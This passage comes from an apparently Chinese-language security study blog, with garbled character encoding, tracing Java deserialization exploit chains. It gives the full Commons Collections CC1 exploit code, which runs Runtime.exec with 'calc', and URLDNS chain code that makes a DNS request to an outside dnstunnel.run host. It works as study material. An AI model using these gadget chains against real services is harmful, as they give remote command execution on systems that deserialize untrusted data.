class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡"><a href="#è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡" class="headerlink" title="è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡"></a>è§£å†³ä¼ å…¥å¯¹è±¡ä¸ä¸ºRuntimeå¯¹è±¡</h3><p>è¿™é‡Œæ‰¾åˆ°ConstantTransfomerï¼Œçœ‹å®ƒé‡Œé¢çš„ä¸¤ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149259.png" alt="image-20230426214930163"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iConstant = constantToReturn;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformæ–¹æ³•è¿”å›æ„é€ å‡½æ•°ä¸­ä¼ å…¥çš„å‚æ•°ï¼Œé‚£ä¹ˆæ§åˆ¶å…¶è¿”å›Runtime.classå°±è§£å†³äº†è¿™ä¸ªé—®é¢˜<br>æ‰€ä»¥ç°åœ¨payloadä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">map.put(<span class="string">&quot;kkk&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHdConstructor</span> <span class="operator">=</span>  c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,Map.class&#125;);  <span class="comment">//è·å–ç±»çš„æ„é€ æ–¹æ³•  </span></span><br><span class="line">annotationInvocationHdConstructor.setAccessible(<span class="literal">true</span>); <span class="comment">//ä¿è¯å¯ä»¥è®¿é—®  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHdConstructor.newInstance(Override.class, transformedMap);  </span><br><span class="line">serialize(o);  </span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="è§£å†³ä¸¤ä¸ªifé—®é¢˜"><a href="#è§£å†³ä¸¤ä¸ªifé—®é¢˜" class="headerlink" title="è§£å†³ä¸¤ä¸ªifé—®é¢˜"></a>è§£å†³ä¸¤ä¸ªifé—®é¢˜</h3><p>é€šè¿‡è°ƒè¯•å‘ç°ï¼Œè¿™é‡Œä¸ä¼šè¿›å…¥ifä¼šç›´æ¥è·³è¿‡setValue<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149733.png" alt="image-20230426214954634"><br>æˆ‘ä»¬å¾€ä¸Šåˆ†æä¸€ä¸‹memberTypeçš„æ¥æºçœ‹çœ‹å®ƒçš„ä½œç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150959.png" alt="image-20230426215001865"><br>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯è·å–ä¼ å‚ä¸­æ³¨è§£çš„æˆå‘˜æ–¹æ³•ï¼Œæ‰€ä»¥memberTypeä¸èƒ½ä¸ºç©ºå³æ³¨è§£çš„æˆå‘˜æ–¹æ³•ä¸èƒ½ä¸ºç©ºï¼Œç„¶åå»æ‰¾ä¼ å…¥çš„æ³¨è§£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150779.png" alt="image-20230426215011729"><br>å¯ä»¥çœ‹åˆ°æ³¨è§£ä¸ºOverrideï¼Œç‚¹è¿›å»çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150156.png" alt="image-20230426215022091"><br>ä¸ºç©ºï¼Œæ‰€ä»¥è¿™ä¸ªæ³¨è§£ä¸è¡Œï¼Œç”¨<code>Target.class</code> å°è¯•ä¸€ä¸‹ï¼Œç‚¹è¿› <code>Target</code>ï¼Œå½“ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ä¸º <code>value</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ <code>hashmap.put</code> ä¹Ÿéœ€è¦ä¿®æ”¹ä¸º <code>value</code>ï¼Œå› ä¸ºç¬¬äºŒä¸ªifå°±æ˜¯åˆ¤æ–­æˆå‘˜å˜é‡ä¸hashMapä¼ å…¥çš„å‚æ•°æ˜¯å¦ç›¸ç­‰ï¼Œä¿®æ”¹å®Œä¹‹ååˆ°ç»“æŸäº†</p><h3 id="æœ€ç»ˆEXP"><a href="#æœ€ç»ˆEXP" class="headerlink" title="æœ€ç»ˆEXP"></a>æœ€ç»ˆEXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorateMap);  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151916.png" alt="image-20230426215110821"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>çœ‹ä¸€ä¸‹æ•´ä¸ªçš„åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransfomer#transform</span><br><span class="line">   TransformedMap#checkSetValue</span><br><span class="line">      AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">         AnnotationInvocation#readObject</span><br><span class="line"></span><br><span class="line">è¾…åŠ©åˆ©ç”¨é“¾</span><br><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure><p>æµç¨‹å›¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151401.png" alt="image-20230426215124329"><br>æ„Ÿè§‰è·Ÿå®Œè¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨ï¼Œè¿˜æ˜¯å¾—å®é™…è¿ç”¨ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹URLDNSé“¾</title>
      <link href="/undefined/15463.html"/>
      <url>/undefined/15463.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ”¾ä»£ç ï¼Œæ„Ÿè§‰è¿˜æ˜¯è‡ªå·±è·Ÿç€è§†é¢‘æ‰‹å†™ä¸€éæ›´å¥½ç†è§£ï¼Œå¾ˆå¤šç†è§£æ”¾åœ¨æ³¨é‡Šä¸­äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//å…¥å£ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//è°ƒç”¨é“¾ä¸­çš„ç±»  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://vnmkzfpuho.dnstunnel.run&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//é€šè¿‡åå°„è·å–åˆ°urlä¸­çš„hashcodeå±æ€§  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">        <span class="comment">//hashcodeä¸ºç§æœ‰å±æ€§ï¼Œé€šè¿‡ä¸‹é¢æ–¹æ³•è®¾ç½®ä¸ºå¯æ“ä½œ  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåœ¨putå‰éœ€è¦å°†hashCodeå€¼æ”¹ä¸€ä¸‹ï¼Œä¸ç„¶putæ–¹æ³•ä¹Ÿä¼šè¯·æ±‚dnsï¼Œè¿™æ ·ä¸ç®¡æœ‰æ²¡æœ‰ååºåˆ—åŒ–éƒ½ä¼šè¯·æ±‚dns  </span></span><br><span class="line">  </span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//é‡æ–°è®¾ï¼Œé¿å…æ··æ·†  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//æ”¹å›ï¼Œä¸ç„¶è¿™æ¡é“¾å°±ä¸èƒ½åˆ©ç”¨  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿›è¡Œåºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        w.writeObject(hashMap);  </span><br><span class="line">        System.out.println(w);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è¿›è¡Œååºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        o.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>çœ‹ä¸€ä¸‹å¤§ä½¬æ€»ç»“çš„åŸç†<br><em><strong>java.util.HashMap é‡å†™äº† readObject, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ hash å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ java.net.URL çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ getHostAddress æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</strong></em></p><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>è¿›å…¥åˆ°hashMapç±»ä¸­å¯ä»¥çœ‹åˆ°å®ƒæœ‰åºåˆ—åŒ–çš„æ¥å£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232239690.png" alt="image-20230422211906952"><br>å¹¶ä¸”é‡å†™äº†readObjectï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–æ•°æ®ï¼Œåœ¨Javaä¸­ï¼Œå¦‚æœreadObjectè¢«é‡å†™é‚£ä¹ˆé¦–å…ˆä¼šè°ƒç”¨é‡å†™çš„readObjectï¼Œä¸‹é¢è¿™é‡Œçš„sä¸ºè¾“å…¥æµè¯æ˜å¯æ§<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242194.png" alt="image-20230423224233141"><br>å¼€å§‹è°ƒè¯•ï¼Œé¦–å…ˆç›´æ¥åœ¨ä¸‹é¢è¿™é‡Œè¿›å…¥hashMapç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242993.png" alt="image-20230423224245956"><br>ç„¶åæ‰¾åˆ°readObjectæ–¹æ³•åœ¨putVal()æ–¹æ³•ä½ç½®ä¸‹æ–­ç‚¹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242372.png" alt="image-20230423224257331"><br>è¿™é‡Œhash()æ–¹æ³•å¯¹keyå€¼é‡æ–°è¿›è¡Œäº†è®¡ç®—è€Œkeyå€¼ä¸ºURLç±»çš„å¯¹è±¡ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243955.png" alt="image-20230423224317914"><br>hash()æ–¹æ³•é‡Œé¢è°ƒç”¨äº†hashCode()æ–¹æ³•ï¼Œè¿™é‡Œkeyæ˜¯URLçš„å¯¹è±¡æ‰€ä»¥è¿™é‡Œçš„hashCodeæ–¹æ³•æ˜¯URLç±»ä¸­çš„ï¼Œè¿™é‡Œè°ƒè¯•çš„æ—¶å€™ä¸€å®šè¦åˆ°keyä¸ºURLå¯¹è±¡åæ‰èƒ½è¿›å…¥URLç±»ä¸­hashCode()æ–¹æ³•ï¼Œä¸ç„¶è¿›å…¥çš„å°±æ˜¯Objectä¸­çš„hashCode()æ–¹æ³•ï¼Œå¯¹äºå°ç™½è¿™é‡Œå¾ˆå®¹æ˜“è¿·ç³Šï¼Œæ¯”å¦‚æˆ‘ï¼Œç»§ç»­è·Ÿè¿›<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243515.png" alt="image-20230423224330461"><br>æ¥åˆ°äº†URLçš„hashCode()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå€¼ä¸ä¸º-1çš„è¯å°±ç›´æ¥è¿”å›äº†ï¼Œæ‰€ä»¥å€¼å¿…é¡»ä¸º-1ï¼Œåœ¨è¿™ä¸ªç±»ä¸­å®ƒçš„å€¼å·²ç»åˆå§‹åŒ–å¥½äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243334.png"><br>ç»§ç»­åˆ†æï¼Œä¸‹é¢è¿™é‡Œå¯¹hashCodeè¿›è¡Œäº†å¤„ç†ï¼Œè·Ÿè¿›handlerå¯¹è±¡çš„hashCode()æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243350.png"><br>å¯ä»¥çœ‹åˆ°handleræ˜¯URLStreamHandlerçš„å¯¹è±¡<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244392.png" alt="image-20230423224413351"><br>å¯ä»¥çœ‹åˆ°åœ¨å¯¹hashCodeè¿›è¡Œå¤„ç†æ—¶è°ƒç”¨äº†getHostAddress()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–IPåœ°å€<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244708.png" alt="image-20230423224436669"><br>è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥è´´ä¸€ä½å¤§ä½¬å¸¦æœ‰æ³¨é‡Šçš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//å…ˆåˆ¤æ–­è¯¥URLçš„hostAddresså±æ€§æ˜¯å¦å·²ç»æœ‰å€¼äº†</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//å¦‚æœå·²æœ‰å€¼ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//è·å–Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//è·å–IPåœ°å€ï¼Œå¹¶æŠŠå€¼èµ‹ç»™URLçš„hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œå¦‚æœä½ ä¹‹å‰å·²ç»è®¿é—®è¿‡dnsçš„åŸŸåé‚£ä¹ˆå°±ä¸ä¼šå‡ºå‘ç¬¬äºŒæ¬¡ï¼Œæˆ‘å°±æ˜¯å› ä¸ºè¿™ä¸ªå¡äº†åŠå¤©è¿˜ä»¥ä¸ºä»£ç æœ‰é—®é¢˜ï¼Œæœ€ååœ¨ä¸‹é¢è¿™é‡Œå‘èµ·DNSè¯·æ±‚<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244816.png" alt="image-20230423224452776"><br>åé¢å…·ä½“æ€ä¹ˆå‘èµ·è¯·æ±‚å¯å‚è€ƒ<a href="https://leihehe.top/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹URLDNSåˆ©ç”¨é“¾(7) | LeiH - Blog (leihehe.top)</a><br>æ‰§è¡Œç¨‹åºå¯çœ‹åˆ°è¯·æ±‚æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232245550.png" 